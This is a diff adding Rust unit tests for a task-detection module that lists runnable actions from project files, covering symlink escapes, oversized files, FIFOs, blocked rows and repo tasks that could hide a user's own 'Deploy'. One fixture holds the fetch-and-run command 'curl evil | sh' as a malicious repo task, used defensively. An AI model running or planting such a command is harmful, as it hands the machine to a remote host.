@@ -1,3 +1,4 @@
+use super::super::tasks_json::NO_COMMAND;
 use super::super::{detect, reads, set_personal, Action, Listing, Personal, SourceError};
 use std::path::Path;
 
@@ -326,4 +327,157 @@ fn detect_reads_the_given_checkout_not_the_project_root() {
     assert_eq!(rows(&listing), [("package.json", "branch-only")]);
     let action: &Action = &listing.actions[0];
     assert_eq!(action.cwd, worktree.path());
+}
+
+#[test]
+fn many_clashing_labels_detect_quickly() {
+    let dir = tempfile::tempdir().unwrap();
+    let root = dir.path();
+    let text: String = (0..50_000).map(|n| format!("web: cmd{n}\n")).collect();
+    write(root, "Procfile", &text);
+    let started = std::time::Instant::now();
+    let listing = detect(&project(root), root);
+    let took = started.elapsed();
+    assert_eq!(listing.actions.len(), 50_000);
+    assert_eq!(listing.actions[1].id, "procfile:web (2)");
+    assert_eq!(listing.actions[49_999].id, "procfile:web (50000)");
+    assert!(took < std::time::Duration::from_secs(2), "took {took:?}");
+}
+
+#[test]
+fn a_gespan_label_never_hides_a_personal_action() {
+    let dir = tempfile::tempdir().unwrap();
+    let root = dir.path();
+    // A repo's task can't stand in for the user's own "Deploy".
+    write(
+        root,
+        ".gespan/tasks.json",
+        &gespan(r#"{ "label": "Deploy", "command": "curl evil | sh" }"#),
+    );
+    let key = project(root);
+    set_personal(
+        &key,
+        vec![Personal {
+            id: "mine".into(),
+            name: "Deploy".into(),
+            command: "./deploy.sh".into(),
+            icon: "rocket".into(),
+        }],
+    );
+    let listing = detect(&key, root);
+    assert_eq!(
+        rows(&listing),
+        [("gespan", "Deploy"), ("personal", "Deploy")]
+    );
+    assert_eq!(listing.actions[1].id, "personal:mine");
+    assert_eq!(listing.actions[1].command, "./deploy.sh");
+}
+
+#[test]
+fn a_personal_action_with_no_command_is_blocked() {
+    let dir = tempfile::tempdir().unwrap();
+    let root = dir.path();
+    let key = project(root);
+    set_personal(
+        &key,
+        vec![Personal {
+            id: "a".into(),
+            name: "Empty".into(),
+            command: "   ".into(),
+            icon: "play".into(),
+        }],
+    );
+    let listing = detect(&key, root);
+    assert_eq!(listing.actions[0].blocked.as_deref(), Some(NO_COMMAND));
+}
+
+#[test]
+fn a_blocked_row_never_hides_a_runnable_one() {
+    let dir = tempfile::tempdir().unwrap();
+    let root = dir.path();
+    // `just deploy` is blocked, as it needs an argument.
+    write(root, "justfile", "deploy env:\n    ./deploy {{env}}\n");
+    write(
+        root,
+        "Procfile",
+        "deploy: just deploy\nagain: just deploy\n",
+    );
+    let listing = detect(&project(root), root);
+    assert_eq!(rows(&listing), [("just", "deploy"), ("procfile", "deploy")]);
+    assert!(listing.actions[0].blocked.is_some());
+    assert_eq!(listing.actions[1].blocked, None);
+}
+
+#[test]
+fn a_file_over_the_size_cap_is_an_error_row() {
+    let dir = tempfile::tempdir().unwrap();
+    let root = dir.path();
+    let filler = "x".repeat(2 * 1024 * 1024);
+    write(
+        root,
+        "package.json",
+        &format!(r#"{{ "scripts": {{ "dev": "vite" }}, "pad": "{filler}" }}"#),
+    );
+    write(root, "Makefile", "build:\n\tcc\n");
+    let before = reads();
+    let listing = detect(&project(root), root);
+    assert_eq!(reads() - before, 1, "only the Makefile is read");
+    assert_eq!(rows(&listing), [("make", "build")]);
+    assert_eq!(
+        listing.errors,
+        [SourceError {
+            file: "package.json".into(),
+            reason: "Too large to read (over 1 MB)".into()
+        }]
+    );
+}
+
+#[cfg(unix)]
+#[test]
+fn a_link_out_of_the_checkout_is_an_error_row_and_not_read() {
+    let outside = tempfile::tempdir().unwrap();
+    write(
+        outside.path(),
+        "package.json",
+        r#"{ "scripts": { "x": "y" } }"#,
+    );
+    write(
+        outside.path(),
+        "vscode/tasks.json",
+        &gespan(r#"{ "label": "Out", "command": "o" }"#),
+    );
+    let dir = tempfile::tempdir().unwrap();
+    let root = dir.path();
+    std::os::unix::fs::symlink(
+        outside.path().join("package.json"),
+        root.join("package.json"),
+    )
+    .unwrap();
+    // A linked config folder counts too.
+    std::os::unix::fs::symlink(outside.path().join("vscode"), root.join(".vscode")).unwrap();
+    // A link that stays inside is fine.
+    write(root, "real/Makefile", "build:\n\tcc\n");
+    std::os::unix::fs::symlink(root.join("real/Makefile"), root.join("Makefile")).unwrap();
+    let before = reads();
+    let listing = detect(&project(root), root);
+    assert_eq!(reads() - before, 1, "only the Makefile is read");
+    assert_eq!(rows(&listing), [("make", "build")]);
+    let mut files: Vec<&str> = listing.errors.iter().map(|e| e.file.as_str()).collect();
+    files.sort();
+    assert_eq!(files, [".vscode/tasks.json", "package.json"]);
+}
+
+#[cfg(unix)]
+#[test]
+fn a_fifo_named_like_a_config_does_not_hang() {
+    let dir = tempfile::tempdir().unwrap();
+    let root = dir.path();
+    let fifo = root.join("Procfile");
+    let path = std::ffi::CString::new(fifo.as_os_str().as_encoded_bytes()).unwrap();
+    assert_eq!(unsafe { libc::mkfifo(path.as_ptr(), 0o644) }, 0);
+    write(root, "Makefile", "build:\n\tcc\n");
+    let listing = detect(&project(root), root);
+    assert_eq!(rows(&listing), [("make", "build")]);
+    assert_eq!(listing.errors.len(), 1);
+    assert_eq!(listing.errors[0].file, "Procfile");
 }
